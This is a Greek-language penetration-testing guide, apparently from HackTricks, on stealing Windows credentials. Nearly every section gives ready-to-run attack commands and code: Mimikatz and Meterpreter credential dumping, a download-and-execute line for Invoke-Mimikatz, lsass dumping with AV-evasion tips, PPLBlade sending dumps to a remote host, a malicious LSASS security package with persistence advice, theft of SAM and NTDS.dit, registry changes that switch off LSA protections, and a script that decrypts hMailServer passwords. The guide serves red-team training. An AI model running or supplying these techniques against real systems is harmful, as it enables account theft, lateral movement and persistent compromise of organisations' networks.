# Υποκλοπή διαπιστευτηρίων Windows

{{#include ../../banners/hacktricks-training.md}}

## Διαπιστευτήρια Mimikatz

```bash
#Elevate Privileges to extract the credentials
privilege::debug #This should give am error if you are Admin, butif it does, check if the SeDebugPrivilege was removed from Admins
token::elevate
#Extract from lsass (memory)
sekurlsa::logonpasswords
#Extract from lsass (service)
lsadump::lsa /inject
#Extract from SAM
lsadump::sam
#One liner
mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"
```

**Μάθετε τι άλλο μπορεί να κάνει το Mimikatz σε** [**αυτή τη σελίδα**](credentials-mimikatz.md)**.**

### Invoke-Mimikatz

```bash
IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -DumpCreds #Dump creds from memory
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"'
```

[**Μάθετε εδώ για ορισμένα πιθανά μέτρα προστασίας διαπιστευτηρίων.**](credentials-protections.md) **Αυτά τα μέτρα προστασίας θα μπορούσαν να εμποδίσουν το Mimikatz να εξαγάγει ορισμένα διαπιστευτήρια.**

## Διαπιστευτήρια με Meterpreter

Χρησιμοποιήστε το [**Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **που** έχω δημιουργήσει για να **αναζητήσετε κωδικούς πρόσβασης και hashes** στο σύστημα του θύματος.

```bash
#Credentials from SAM
post/windows/gather/smart_hashdump
hashdump

#Using kiwi module
load kiwi
creds_all
kiwi_cmd "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam"

#Using Mimikatz module
load mimikatz
mimikatz_command -f "sekurlsa::logonpasswords"
mimikatz_command -f "lsadump::lsa /inject"
mimikatz_command -f "lsadump::sam"
```

## Παράκαμψη AV

### Procdump + Mimikatz

Καθώς το **Procdump από** [**SysInternals** ](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)**είναι ένα νόμιμο εργαλείο της Microsoft**, δεν εντοπίζεται από το Defender.\
Μπορείτε να χρησιμοποιήσετε αυτό το εργαλείο για να **κάνετε dump τη διεργασία lsass**, να **κατεβάσετε το dump** και να **εξαγάγετε** τα **διαπιστευτήρια τοπικά** από το dump.

Μπορείτε επίσης να χρησιμοποιήσετε το [SharpDump](https://github.com/GhostPack/SharpDump).

```bash:Dump lsass
#Local
C:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
#Remote, mount https://live.sysinternals.com which contains procdump.exe
net use Z: https://live.sysinternals.com
Z:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
# Get it from webdav
\\live.sysinternals.com\tools\procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

```c:Extract credentials from the dump
//Load the dump
mimikatz # sekurlsa::minidump lsass.dmp
//Extract credentials
mimikatz # sekurlsa::logonPasswords
```

Αυτή η διαδικασία εκτελείται αυτόματα με το [SprayKatz](https://github.com/aas-n/spraykatz): `./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24`

**Σημείωση**: Κάποια **AV** μπορεί να **ανιχνεύσουν** ως **κακόβουλη** τη χρήση του **procdump.exe για dump του lsass.exe**, επειδή **ανιχνεύουν** τις συμβολοσειρές **"procdump.exe" και "lsass.exe"**. Επομένως, είναι πιο **stealthy** να περάσετε ως **argument** το **PID** του lsass.exe στο procdump **αντί για** το **όνομα lsass.exe.**

### Dumping lsass με **comsvcs.dll**

Ένα DLL με όνομα **comsvcs.dll**, το οποίο βρίσκεται στο `C:\Windows\System32`, είναι υπεύθυνο για το **dumping της μνήμης διεργασιών** σε περίπτωση crash. Αυτό το DLL περιλαμβάνει μια **function** με όνομα **`MiniDumpW`**, η οποία έχει σχεδιαστεί ώστε να εκτελείται μέσω του `rundll32.exe`.\
Δεν έχει σημασία η χρήση των δύο πρώτων arguments, αλλά το τρίτο χωρίζεται σε τρία στοιχεία. Το ID της διεργασίας που θα γίνει dump αποτελεί το πρώτο στοιχείο, η τοποθεσία του dump file το δεύτερο, ενώ το τρίτο στοιχείο πρέπει να είναι ακριβώς η λέξη **full**. Δεν υπάρχουν εναλλακτικές επιλογές.\
Αφού αναλύσει αυτά τα τρία στοιχεία, το DLL δημιουργεί το dump file και μεταφέρει σε αυτό τη μνήμη της καθορισμένης διεργασίας.\
Μπορείτε να χρησιμοποιήσετε το **comsvcs.dll** για να κάνετε dump τη διεργασία lsass, χωρίς να χρειάζεται να ανεβάσετε και να εκτελέσετε το procdump. Αυτή η μέθοδος περιγράφεται λεπτομερώς στο [https://en.hackndo.com/remote-lsass-dump-passwords/](https://en.hackndo.com/remote-lsass-dump-passwords).<sup>[[9]](#references)</sup>

Για την εκτέλεση χρησιμοποιείται η ακόλουθη εντολή:

```bash
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass pid> lsass.dmp full
```

**Μπορείτε να αυτοματοποιήσετε αυτήν τη διαδικασία με** [**lssasy**](https://github.com/Hackndo/lsassy)**.**

### **Dumping lsass με τη Διαχείριση Εργασιών**

1. Κάντε δεξί κλικ στη γραμμή εργασιών και επιλέξτε «Διαχείριση εργασιών»
2. Κάντε κλικ στην επιλογή «Περισσότερες λεπτομέρειες»
3. Αναζητήστε τη διεργασία «Local Security Authority Process» στην καρτέλα «Διεργασίες»
4. Κάντε δεξί κλικ στη διεργασία «Local Security Authority Process» και επιλέξτε «Create dump file».

### Dumping lsass με το procdump

Το [Procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) είναι ένα δυαδικό αρχείο υπογεγραμμένο από τη Microsoft, το οποίο αποτελεί μέρος της σουίτας [sysinternals](https://docs.microsoft.com/en-us/sysinternals/).

Ένα ήδη υπάρχον πλήρες dump κατάρρευσης του συστήματος ή ένα συμπιεσμένο αντίγραφό του σε προσβάσιμο φάκελο χρήστη μπορεί να διατηρεί υλικό διαπιστευτηρίων για offline ανάλυση. Ονόματα αρχείων όπως `MEMORY.DMP` και `MEMORY.7z` είναι απλώς ενδείξεις για έλεγχο: επαληθεύστε την προέλευση και την πρόσβαση και μην υποθέτετε ότι περιέχουν αξιοποιήσιμα ή τρέχοντα διαπιστευτήρια.

```
Get-Process -Name LSASS
.\procdump.exe -ma 608 lsass.dmp
```

## Dumping lsass με PPLBlade

Το [**PPLBlade**](https://github.com/tastypepperoni/PPLBlade) είναι ένα εργαλείο απόρριψης Protected Process, το οποίο υποστηρίζει την απόκρυψη των memory dump και τη μεταφορά τους σε απομακρυσμένους σταθμούς εργασίας χωρίς να αποθηκεύονται στον δίσκο.

**Βασικές λειτουργίες**:

1. Παράκαμψη της προστασίας PPL
2. Απόκρυψη αρχείων memory dump για την αποφυγή των μηχανισμών ανίχνευσης του Defender που βασίζονται σε signatures
3. Μεταφόρτωση memory dump με τις μεθόδους RAW και SMB, χωρίς αποθήκευση στον δίσκο (fileless dump)

```bash
PPLBlade.exe --mode dump --name lsass.exe --handle procexp --obfuscate --dumpmode network --network raw --ip 192.168.1.17 --port 1234
```

## LalsDumper – απόρριψη LSASS βάσει SSP χωρίς MiniDumpWriteDump

Το Ink Dragon χρησιμοποιεί ένα dumper τριών σταδίων με την ονομασία **LalsDumper**, το οποίο δεν καλεί ποτέ τη `MiniDumpWriteDump`, οπότε τα EDR hooks σε αυτό το API δεν ενεργοποιούνται:<sup>[[3]](#references)</sup>

1. **Stage 1 loader (`lals.exe`)** – αναζητά στο `fdp.dll` ένα placeholder αποτελούμενο από 32 πεζά γράμματα `d`, το αντικαθιστά με την απόλυτη διαδρομή προς το `rtu.txt`, αποθηκεύει το τροποποιημένο DLL ως `nfdp.dll` και καλεί την `AddSecurityPackageA("nfdp","fdp")`. Αυτό αναγκάζει το **LSASS** να φορτώσει το κακόβουλο DLL ως νέο Security Support Provider (SSP).
2. **Stage 2 μέσα στο LSASS** – όταν το LSASS φορτώνει το `nfdp.dll`, το DLL διαβάζει το `rtu.txt`, κάνει XOR σε κάθε byte με `0x20` και αντιστοιχίζει το αποκωδικοποιημένο blob στη μνήμη πριν μεταφέρει την εκτέλεση.
3. **Stage 3 dumper** – το payload που έχει αντιστοιχιστεί στη μνήμη επανυλοποιεί τη λογική του MiniDump χρησιμοποιώντας **direct syscalls** που επιλύονται από κατακερματισμένα ονόματα API (`seed = 0xCD7815D6; h ^= (ch + ror32(h,8))`). Ένα ειδικό export με την ονομασία `Tom` ανοίγει το `%TEMP%\<pid>.ddt`, γράφει ένα συμπιεσμένο dump του LSASS στο αρχείο και κλείνει το handle, ώστε να είναι δυνατή η εκ των υστέρων εξαγωγή του.

Σημειώσεις για τον χειριστή:

* Διατηρήστε τα `lals.exe`, `fdp.dll`, `nfdp.dll` και `rtu.txt` στον ίδιο κατάλογο. Το Stage 1 αντικαθιστά το hard-coded placeholder με την απόλυτη διαδρομή προς το `rtu.txt`, οπότε ο διαχωρισμός τους διακόπτει την αλυσίδα.
* Η καταχώριση γίνεται με την προσθήκη του `nfdp` στο `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages`. Μπορείτε να προσθέσετε μόνοι σας αυτήν την τιμή, ώστε το LSASS να φορτώνει ξανά το SSP σε κάθε εκκίνηση.
* Τα αρχεία `%TEMP%\*.ddt` είναι συμπιεσμένα dumps. Αποσυμπιέστε τα τοπικά και, στη συνέχεια, τροφοδοτήστε τα στο Mimikatz/Volatility για εξαγωγή διαπιστευτηρίων.
* Για να εκτελεστεί το `lals.exe` απαιτούνται δικαιώματα admin/SeTcb, ώστε να πετύχει η `AddSecurityPackageA`. Μόλις επιστρέψει η κλήση, το LSASS φορτώνει διαφανώς το rogue SSP και εκτελεί το Stage 2.
* Η αφαίρεση του DLL από τον δίσκο δεν το απομακρύνει από το LSASS. Διαγράψτε την καταχώριση μητρώου και επανεκκινήστε το LSASS (με επανεκκίνηση του συστήματος) ή αφήστε το για μακροχρόνια persistence.

## CrackMapExec

### Εξαγωγή hashes SAM

```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sam
```

### Dump LSA secrets

```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --lsa
```

### Dump του NTDS.dit από τον DC-στόχο

```
cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
#~ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss
```

### Dump του ιστορικού κωδικών πρόσβασης NTDS.dit από τον DC-στόχο

```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-history
```

### Εμφάνιση του χαρακτηριστικού pwdLastSet για κάθε λογαριασμό του NTDS.dit

```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-pwdLastSet
```

## Υποκλοπή SAM & SYSTEM

Αυτά τα αρχεία πρέπει να **βρίσκονται** στα _C:\windows\system32\config\SAM_ και _C:\windows\system32\config\SYSTEM._ Ωστόσο, **δεν μπορείτε απλώς να τα αντιγράψετε με τον συνηθισμένο τρόπο**, επειδή προστατεύονται.

### Από το Registry

Ο ευκολότερος τρόπος να υποκλέψετε αυτά τα αρχεία είναι να λάβετε ένα αντίγραφό τους από το Registry:

```
reg save HKLM\sam sam
reg save HKLM\system system
reg save HKLM\security security
```

**Κατεβάστε** αυτά τα αρχεία στο μηχάνημά σας με Kali και **εξαγάγετε τα hashes** χρησιμοποιώντας:

```
samdump2 SYSTEM SAM
impacket-secretsdump -sam sam -security security -system system LOCAL
```

### Volume Shadow Copy

Μπορείτε να αντιγράψετε προστατευμένα αρχεία χρησιμοποιώντας αυτήν την υπηρεσία. Πρέπει να είστε Administrator.

#### Using vssadmin

Το δυαδικό αρχείο vssadmin είναι διαθέσιμο μόνο σε εκδόσεις Windows Server.

```bash
vssadmin create shadow /for=C:
#Copy SAM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SAM C:\Extracted\SAM
#Copy SYSTEM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SYSTEM C:\Extracted\SYSTEM
#Copy ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\ntds\ntds.dit C:\Extracted\ntds.dit

# You can also create a symlink to the shadow copy and access it
mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
```

Όμως μπορείτε να κάνετε το ίδιο από το **Powershell**. Αυτό είναι ένα παράδειγμα του **πώς να αντιγράψετε το αρχείο SAM** (η μονάδα δίσκου που χρησιμοποιείται είναι η «C:» και αποθηκεύεται στο C:\users\Public), αλλά μπορείτε να το χρησιμοποιήσετε για την αντιγραφή οποιουδήποτε προστατευμένου αρχείου:

```bash
$service=(Get-Service -name VSS)
if($service.Status -ne "Running"){$notrunning=1;$service.Start()}
$id=(gwmi -list win32_shadowcopy).Create("C:\","ClientAccessible").ShadowID
$volume=(gwmi win32_shadowcopy -filter "ID='$id'")
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\sam" C:\Users\Public
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\system" C:\Users\Public
cmd /c copy "$($volume.DeviceObject)\windows\ntds\ntds.dit" C:\Users\Public
$volume.Delete();if($notrunning -eq 1){$service.Stop()}
```

Κώδικας από το βιβλίο: [https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html](https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html)<sup>[[7]](#references)</sup>

### Invoke-NinjaCopy

Τέλος, μπορείτε επίσης να χρησιμοποιήσετε το [**PS script Invoke-NinjaCopy**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1) για να δημιουργήσετε ένα αντίγραφο των SAM, SYSTEM και ntds.dit.

```bash
Invoke-NinjaCopy.ps1 -Path "C:\Windows\System32\config\sam" -LocalDestination "c:\copy_of_local_sam"
```

## **Διαπιστευτήρια Active Directory - NTDS.dit**

Το αρχείο **NTDS.dit** είναι γνωστό ως η καρδιά του **Active Directory** και περιέχει κρίσιμα δεδομένα για αντικείμενα χρηστών, ομάδες και τις συμμετοχές τους. Εκεί αποθηκεύονται τα **hashes κωδικών πρόσβασης** των χρηστών του domain. Αυτό το αρχείο είναι μια βάση δεδομένων **Extensible Storage Engine (ESE)** και βρίσκεται στη διαδρομή **_%SystemRoom%/NTDS/ntds.dit_**.

Σε αυτήν τη βάση δεδομένων διατηρούνται τρεις βασικοί πίνακες:

- **Πίνακας δεδομένων**: Αποθηκεύει λεπτομέρειες για αντικείμενα, όπως χρήστες και ομάδες.
- **Πίνακας συνδέσεων**: Καταγράφει σχέσεις, όπως συμμετοχές σε ομάδες.
- **Πίνακας SD**: Εδώ αποθηκεύονται οι **περιγραφείς ασφαλείας** για κάθε αντικείμενο, διασφαλίζοντας την ασφάλεια και τον έλεγχο πρόσβασης στα αποθηκευμένα αντικείμενα.

Η έρευνα του Christoffer Andersson στο επίπεδο της βάσης δεδομένων τεκμηριώνει αναλυτικότερα αυτούς τους πίνακες και τη συμπεριφορά τους ανά έκδοση.<sup>[[8]](#references)</sup>

Τα Windows χρησιμοποιούν το _Ntdsa.dll_ για να αλληλεπιδρούν με αυτό το αρχείο, ενώ αυτό χρησιμοποιείται από το _lsass.exe_. Έτσι, **μέρος** του αρχείου **NTDS.dit** μπορεί να βρίσκεται **στη μνήμη του `lsass`** (πιθανότατα θα βρείτε τα δεδομένα στα οποία έγινε πρόσβαση πιο πρόσφατα, λόγω της βελτίωσης της απόδοσης με χρήση **cache**).

#### Αποκρυπτογράφηση των hashes μέσα στο NTDS.dit

Το hash κρυπτογραφείται τρεις φορές:

1. Αποκρυπτογραφήστε το Password Encryption Key (**PEK**) χρησιμοποιώντας το **BOOTKEY** και το **RC4**.
2. Αποκρυπτογραφήστε το **hash** χρησιμοποιώντας το **PEK** και το **RC4**.
3. Αποκρυπτογραφήστε το **hash** χρησιμοποιώντας το **DES**.

Το **PEK** έχει **την ίδια τιμή σε κάθε domain controller**, αλλά είναι **κρυπτογραφημένο** μέσα στο **NTDS.dit** με το **BOOTKEY**, το οποίο είναι ειδικό για τον συγκεκριμένο DC και προέρχεται από την ομάδα **SYSTEM** αυτού του domain controller. Επομένως, για την εξαγωγή διαπιστευτηρίων απαιτούνται τόσο το **NTDS.dit** όσο και το **SYSTEM** (`C:\Windows\System32\config\SYSTEM`).

### Αντιγραφή του NTDS.dit με χρήση του Ntdsutil

Διαθέσιμο από τον Windows Server 2008.

```bash
ntdsutil "ac i ntds" "ifm" "create full c:\copy-ntds" quit quit
```

Μπορείτε επίσης να χρησιμοποιήσετε το τέχνασμα της [**volume shadow copy**](#stealing-sam-and-system) για να αντιγράψετε το αρχείο **ntds.dit**. Να θυμάστε ότι θα χρειαστείτε επίσης ένα αντίγραφο του **SYSTEM file** (και πάλι, χρησιμοποιήστε το τέχνασμα [**εξαγωγής του από το registry ή χρήσης της volume shadow copy**](#stealing-sam-and-system)).

### **Εξαγωγή hashes από το NTDS.dit**

Μόλις **αποκτήσετε** τα αρχεία **NTDS.dit** και **SYSTEM**, μπορείτε να χρησιμοποιήσετε εργαλεία όπως το _secretsdump.py_ για να **εξαγάγετε τα hashes**:

```bash
secretsdump.py LOCAL -ntds ntds.dit -system SYSTEM -outputfile credentials.txt
```

Μπορείτε επίσης να τα **εξαγάγετε αυτόματα** χρησιμοποιώντας έναν έγκυρο χρήστη domain admin:

```
secretsdump.py -just-dc-ntlm <DOMAIN>/<USER>@<DOMAIN_CONTROLLER>
```

Για **μεγάλα αρχεία NTDS.dit**, συνιστάται η εξαγωγή τους με το [gosecretsdump](https://github.com/c-sto/gosecretsdump).

Τέλος, μπορείτε επίσης να χρησιμοποιήσετε το **metasploit module**: _post/windows/gather/credentials/domain_hashdump_ ή το **mimikatz** `lsadump::lsa /inject`

### **Εξαγωγή αντικειμένων τομέα από το NTDS.dit σε βάση δεδομένων SQLite**

Τα αντικείμενα NTDS μπορούν να εξαχθούν σε βάση δεδομένων SQLite με το [ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlite). Εξάγονται όχι μόνο μυστικά, αλλά και όλα τα αντικείμενα και τα χαρακτηριστικά τους, για περαιτέρω εξαγωγή πληροφοριών, όταν έχει ήδη ανακτηθεί το ακατέργαστο αρχείο NTDS.dit.

```
ntdsdotsqlite ntds.dit -o ntds.sqlite --system SYSTEM.hive
```

Το hive `SYSTEM` είναι προαιρετικό, αλλά επιτρέπει την αποκρυπτογράφηση secrets (NT & LM hashes, συμπληρωματικά διαπιστευτήρια, όπως cleartext passwords, κλειδιά Kerberos ή trust, ιστορικό NT & LM passwords). Μαζί με άλλες πληροφορίες, εξάγονται τα ακόλουθα δεδομένα: λογαριασμοί χρηστών και μηχανημάτων με τα hashes τους, σημαίες UAC, χρονική σήμανση τελευταίας σύνδεσης και αλλαγής password, περιγραφές λογαριασμών, ονόματα, UPN, SPN, ομάδες και αναδρομικές συμμετοχές, δέντρο organizational units και συμμετοχή σε αυτές, trusted domains με τύπο, κατεύθυνση και χαρακτηριστικά trust...

## Lazagne

Κατεβάστε το binary από [εδώ](https://github.com/AlessandroZ/LaZagne/releases). Μπορείτε να χρησιμοποιήσετε αυτό το binary για να εξαγάγετε διαπιστευτήρια από διάφορα λογισμικά.

```
lazagne.exe all
```

## Άλλα εργαλεία για την εξαγωγή διαπιστευτηρίων από τα SAM και LSASS

### Windows credentials Editor (WCE)

Αυτό το εργαλείο μπορεί να χρησιμοποιηθεί για την εξαγωγή διαπιστευτηρίων από τη μνήμη. Κατεβάστε το από: [http://www.ampliasecurity.com/research/windows-credentials-editor/](http://www.ampliasecurity.com/research/windows-credentials-editor/)

### fgdump

Εξαγωγή διαπιστευτηρίων από το αρχείο SAM

```
You can find this binary inside Kali, just do: locate fgdump.exe
fgdump.exe
```

### PwDump

Εξαγωγή διαπιστευτηρίων από το αρχείο SAM

```
You can find this binary inside Kali, just do: locate pwdump.exe
PwDump.exe -o outpwdump -x 127.0.0.1
type outpwdump
```

### PwDump7

Κατεβάστε το από:[ http://www.tarasco.org/security/pwdump_7](http://www.tarasco.org/security/pwdump_7) και απλώς **εκτελέστε το** για να εξαχθούν οι κωδικοί πρόσβασης.

## Συλλογή δεδομένων από ανενεργές συνεδρίες RDP και αποδυνάμωση των μηχανισμών ασφαλείας

Το FinalDraft RAT του Ink Dragon περιλαμβάνει ένα tasker `DumpRDPHistory`, οι τεχνικές του οποίου είναι χρήσιμες για κάθε red-teamer:<sup>[[3]](#references)</sup>

### Συλλογή τηλεμετρίας τύπου DumpRDPHistory

* **Εξερχόμενοι στόχοι RDP** – αναλύστε κάθε user hive στη διαδρομή `HKU\<SID>\SOFTWARE\Microsoft\Terminal Server Client\Servers\*`. Κάθε subkey αποθηκεύει το όνομα του server, το `UsernameHint` και τη χρονική σήμανση της τελευταίας εγγραφής. Μπορείτε να αναπαράγετε τη λογική του FinalDraft με PowerShell:

  ```powershell
  Get-ChildItem HKU:\ | Where-Object { $_.Name -match "S-1-5-21" } | ForEach-Object {
      Get-ChildItem "${_.Name}\SOFTWARE\Microsoft\Terminal Server Client\Servers" -ErrorAction SilentlyContinue |
        ForEach-Object {
            $server = Split-Path $_.Name -Leaf
            $user = (Get-ItemProperty $_.Name).UsernameHint
            "OUT:$server:$user:$((Get-Item $_.Name).LastWriteTime)"
        }
  }
  ```

* **Στοιχεία εισερχόμενων συνδέσεων RDP** – αναζητήστε στο αρχείο καταγραφής `Microsoft-Windows-TerminalServices-LocalSessionManager/Operational` τα Event IDs **21** (επιτυχής σύνδεση) και **25** (αποσύνδεση), για να χαρτογραφήσετε ποιος διαχειρίστηκε το σύστημα:

  ```powershell
  Get-WinEvent -LogName "Microsoft-Windows-TerminalServices-LocalSessionManager/Operational" \
    | Where-Object { $_.Id -in 21,25 } \
    | Select-Object TimeCreated,@{n='User';e={$_.Properties[1].Value}},@{n='IP';e={$_.Properties[2].Value}}
  ```

Μόλις μάθετε ποιος Domain Admin συνδέεται τακτικά, κάντε dump το LSASS (με LalsDumper/Mimikatz) όσο η **αποσυνδεδεμένη** συνεδρία του εξακολουθεί να υπάρχει. Το CredSSP + NTLM fallback αφήνει το verifier και τα tokens του στο LSASS, τα οποία μπορούν στη συνέχεια να επαναχρησιμοποιηθούν μέσω SMB/WinRM για να αποκτήσετε το `NTDS.dit` ή να εγκαταστήσετε persistence σε domain controllers.

### Υποβαθμίσεις registry που στοχεύει το FinalDraft

Το ίδιο implant παραποιεί επίσης αρκετά κλειδιά registry, για να διευκολύνει την κλοπή διαπιστευτηρίων:<sup>[[3]](#references)</sup>

```cmd
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 1 /f
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DSRMAdminLogonBehavior /t REG_DWORD /d 2 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v RunAsPPL /t REG_DWORD /d 0 /f
```

* Η ρύθμιση `DisableRestrictedAdmin=1` επιβάλλει την πλήρη επαναχρησιμοποίηση διαπιστευτηρίων/ticket κατά τη χρήση RDP, επιτρέποντας μετακινήσεις τύπου pass-the-hash.
* Η ρύθμιση `LocalAccountTokenFilterPolicy=1` απενεργοποιεί το φιλτράρισμα διακριτικών UAC, ώστε οι τοπικοί admins να λαμβάνουν μη περιορισμένα διακριτικά μέσω δικτύου.
* Η ρύθμιση `DSRMAdminLogonBehavior=2` επιτρέπει στον διαχειριστή DSRM να συνδεθεί ενώ ο DC είναι σε λειτουργία, προσφέροντας στους επιτιθέμενους έναν ακόμη ενσωματωμένο λογαριασμό με υψηλά προνόμια.
* Η ρύθμιση `RunAsPPL=0` καταργεί τις προστασίες LSASS PPL, κάνοντας την πρόσβαση στη μνήμη εύκολη για εργαλεία εξαγωγής, όπως το LalsDumper.

## Διαπιστευτήρια ρύθμισης παραμέτρων hMailServer (μετά την παραβίαση)

Ελέγξτε τα ακριβή αρχεία ρύθμισης παραμέτρων `C:\Program Files\hMailServer\Bin\hMailServer.ini`, `C:\Program Files (x86)\hMailServer\Bin\hMailServer.ini` και `C:\ProgramData\hMailServer\hMailServer.ini`, ανάλογα με τη διάταξη εγκατάστασης. Μια αναγνώσιμη, μη κενή τιμή `[Security] AdministratorPassword=` είναι hash κωδικού πρόσβασης διαχείρισης του hMailServer· δεν αποτελεί ένδειξη κωδικού πρόσβασης Windows Administrator. Αν ανακτηθεί αυτό το διαπιστευτήριο, οποιαδήποτε μετάβαση σε λογαριασμό Windows απαιτεί ανεξάρτητη επαλήθευση της επαναχρησιμοποίησης κωδικού πρόσβασης και των δικαιωμάτων σύνδεσης.

Για εγκαταστάσεις που χρησιμοποιούν βάση δεδομένων SQL CE, η ξεχωριστή τιμή `[Database] Password=` στο INI προστατεύει τη βάση δεδομένων. Σε παλαιού τύπου εγκαταστάσεις, αυτή η τιμή είναι κρυπτογραφημένη με Blowfish χρησιμοποιώντας το στατικό κλειδί `THIS_KEY_IS_NOT_SECRET` και εναλλαγές endian σε λέξεις των 4 byte. Χρησιμοποιήστε τη δεκαεξαδική συμβολοσειρά από το INI με αυτό το απόσπασμα Python:<sup>[[2]](#references)</sup>

Πρώτα επιβεβαιώστε ότι ο τρέχων λογαριασμός μπορεί να διαβάσει **και τα δύο**: το INI και την αντίστοιχη βάση δεδομένων SQL CE `.sdf`. Ο κωδικός πρόσβασης του INI προστατεύει τη βάση δεδομένων· είναι ξεχωριστός από τα hash των λογαριασμών γραμματοκιβωτίου που είναι αποθηκευμένα σε αυτήν. Επιθεωρήστε ή αναβαθμίστε ένα **αντίγραφο** μιας βάσης δεδομένων που χρησιμοποιείται· μην αγγίζετε ποτέ το ενεργό αρχείο.

```python
from Crypto.Cipher import Blowfish
import binascii

def swap4(data):
    return b"".join(data[i:i+4][::-1] for i in range(0, len(data), 4))
enc_hex = "HEX_FROM_HMAILSERVER_INI"
enc = binascii.unhexlify(enc_hex)
key = b"THIS_KEY_IS_NOT_SECRET"
plain = swap4(Blowfish.new(key, Blowfish.MODE_ECB).decrypt(swap4(enc))).rstrip(b"\x00")
print(plain.decode())
```

Με τον κωδικό πρόσβασης σε απλό κείμενο, αντιγράψτε τη βάση δεδομένων SQL CE για να αποφύγετε τα κλειδώματα αρχείων, φορτώστε τον πάροχο 32 bit και αναβαθμίστε τον αν χρειάζεται πριν αναζητήσετε hashes:

```powershell
Copy-Item "C:\Program Files (x86)\hMailServer\Database\hMailServer.sdf" C:\Windows\Temp\
Add-Type -Path "C:\Program Files (x86)\Microsoft SQL Server Compact Edition\v4.0\Desktop\System.Data.SqlServerCe.dll"
$engine = New-Object System.Data.SqlServerCe.SqlCeEngine("Data Source=C:\Windows\Temp\hMailServer.sdf;Password=[DBPASS]")
$engine.Upgrade("Data Source=C:\Windows\Temp\hMailServerUpgraded.sdf")
$conn = New-Object System.Data.SqlServerCe.SqlCeConnection("Data Source=C:\Windows\Temp\hMailServerUpgraded.sdf;Password=[DBPASS]"); $conn.Open()
$cmd = $conn.CreateCommand(); $cmd.CommandText = "SELECT accountaddress,accountpassword FROM hm_accounts"; $cmd.ExecuteReader()
```

Η στήλη `accountpassword` χρησιμοποιεί τη μορφή hash του hMailServer (λειτουργία hashcat `1421`). Ένας κωδικός mailbox που έχει γίνει crack γίνεται pivot σε χρήστη των Windows μόνο αν ο ίδιος κωδικός χρησιμοποιείται ξανά από έναν τοπικό/τομεακό λογαριασμό και αυτός ο λογαριασμός έχει τα απαιτούμενα δικαιώματα απομακρυσμένης σύνδεσης.

## Υποκλοπή LSA Logon Callback (LsaApLogonUserEx2)

Ορισμένα εργαλεία καταγράφουν **κωδικούς πρόσβασης σύνδεσης σε plaintext** παρεμβαίνοντας στο LSA logon callback `LsaApLogonUserEx2`. Η ιδέα είναι να γίνει hook ή wrap στο callback του authentication package, ώστε τα credentials να καταγράφονται **κατά τη σύνδεση** (πριν από το hashing) και, στη συνέχεια, να εγγράφονται στον δίσκο ή να επιστρέφονται στον χειριστή. Αυτό υλοποιείται συνήθως ως helper που κάνει inject στο LSA ή εγγράφεται σε αυτό και, στη συνέχεια, καταγράφει κάθε επιτυχημένο συμβάν interactive/network logon μαζί με το username, το domain και τον κωδικό πρόσβασης.<sup>[[1]](#references)</sup>

Σημειώσεις λειτουργίας:
- Απαιτούνται τοπικά δικαιώματα admin/SYSTEM για τη φόρτωση του helper στη διαδρομή authentication.
- Τα captured credentials εμφανίζονται μόνο όταν πραγματοποιείται σύνδεση (interactive, RDP, service ή network logon, ανάλογα με το hook).

## Αποθηκευμένα Credentials Σύνδεσης SSMS (sqlstudio.bin)

Το SQL Server Management Studio (SSMS) αποθηκεύει πληροφορίες αποθηκευμένων συνδέσεων σε ένα αρχείο `sqlstudio.bin` ανά χρήστη. Εξειδικευμένα dumpers μπορούν να αναλύσουν το αρχείο και να ανακτήσουν αποθηκευμένα SQL credentials. Σε shells που επιστρέφουν μόνο την έξοδο εντολών, το αρχείο συχνά εξάγεται κωδικοποιώντας το σε Base64 και εκτυπώνοντάς το στο stdout.<sup>[[1]](#references)</sup>

```cmd
certutil -encode sqlstudio.bin sqlstudio.b64
type sqlstudio.b64
```

